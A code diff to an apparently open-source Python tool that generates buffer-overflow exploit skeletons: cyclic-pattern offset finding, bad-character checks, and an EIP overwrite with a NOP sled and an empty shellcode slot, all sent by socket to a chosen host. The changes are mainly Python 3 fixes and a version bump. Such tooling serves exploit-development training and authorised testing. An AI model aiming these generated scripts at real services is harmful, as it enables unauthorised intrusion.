@@ -180,6 +180,9 @@ def _script_pattern(host, port, prefix, suffix, length, init, exit):
         pattern_val = "("
         pattern_desc = "  # {} bytes from pattern_create.rb".format(length)
         for idx, item in enumerate(PATTERN):
+            # Only create the length we require
+            if idx == length:
+                break
             if idx % 90 == 0:
                 if idx == 0:
                     pattern_val += '\n    "'
@@ -202,8 +205,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 pattern = {}{}
 
+print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
 try:
-    print('Sending buffer...')
     s.connect(('{}', {}))
 '''.format(
         pattern_val, pattern_desc, host, port
@@ -214,18 +217,18 @@ try:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_init += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_init += """    s.recv(1024)\n"""
 
-    payload = """    s.send('{}' + pattern + '{}' + '\\r\\n')\n""".format(prefix, suffix)
+    payload = """    s.send(('{}' + pattern + '{}' + '\\r\\n').encode())\n""".format(prefix, suffix)
 
     code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_exit += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_exit += """    s.recv(1024)\n"""
     code_tail = """    print('done')
@@ -245,7 +248,6 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-len_total    = {}      # Start at len_overflow and try out how much can be overwritten
 len_overflow = {}      # Use pattern_create.rb and pattern_offset.rb to find exact offset
 eip          = "B"*4     # Ignore for badchar detection
 badchars = (
@@ -269,11 +271,11 @@ badchars = (
 
 buffer = "{}"*len_overflow + eip + badchars
 
+print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
-    print('Sending buffer...')
     s.connect(('{}', {}))
 '''.format(
-        length, length - 30, char, host, port
+        length, char, host, port
     )
 
     code_init = ""
@@ -281,18 +283,18 @@ try:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_init += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_init += """    s.recv(1024)\n"""
 
-    payload = """    s.send('{}' + buffer + '{}' + '\\r\\n')\n""".format(prefix, suffix)
+    payload = """    s.send(('{}' + buffer + '{}' + '\\r\\n').encode())\n""".format(prefix, suffix)
 
     code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_exit += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_exit += """    s.recv(1024)\n"""
     code_tail = """    print('done')
@@ -321,8 +323,8 @@ shellcode    = \"\"
 padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
 buffer  = "{}"*len_overflow + eip + \"\\x90\"*len_nop_sled + shellcode + padding
 
+print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
-    print('Sending buffer...')
     s.connect(('{}', {}))
 '''.format(
         length, length - 30, char, host, port
@@ -333,18 +335,18 @@ try:
         for comm in init.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_init += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_init += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_init += """    s.recv(1024)\n"""
 
-    payload = """    s.send('{}' + buffer + '{}' + '\\r\\n')\n""".format(prefix, suffix)
+    payload = """    s.send(('{}' + buffer + '{}' + '\\r\\n').encode())\n""".format(prefix, suffix)
 
     code_exit = ""
     if exit is not None:
         for comm in exit.split(","):
             d_send, d_expect = comm.split(":")
             if len(d_send) > 0:
-                code_exit += """    s.send('{}' + '\\r\\n')\n""".format(d_send)
+                code_exit += """    s.send(('{}' + '\\r\\n').encode())\n""".format(d_send)
             if len(d_expect) > 0:
                 code_exit += """    s.recv(1024)\n"""
     code_tail = """    print('done')
@@ -405,7 +407,8 @@ def connect(host, port):
 def send(s, data):
     """Send data to socket."""
     try:
-        s.send(data.encode() + "\r\n")
+        data += "\r\n"
+        s.send(data.encode())
     except socket.error as msg:
         s.close()
         return (False, msg)
@@ -507,7 +510,7 @@ example:\n
         "-v",
         "--version",
         action="version",
-        version="%(prog)s 0.4.1 by cytopia",
+        version="%(prog)s 0.4.2 by cytopia",
         help="Show version information,",
     )
     parser.add_argument(
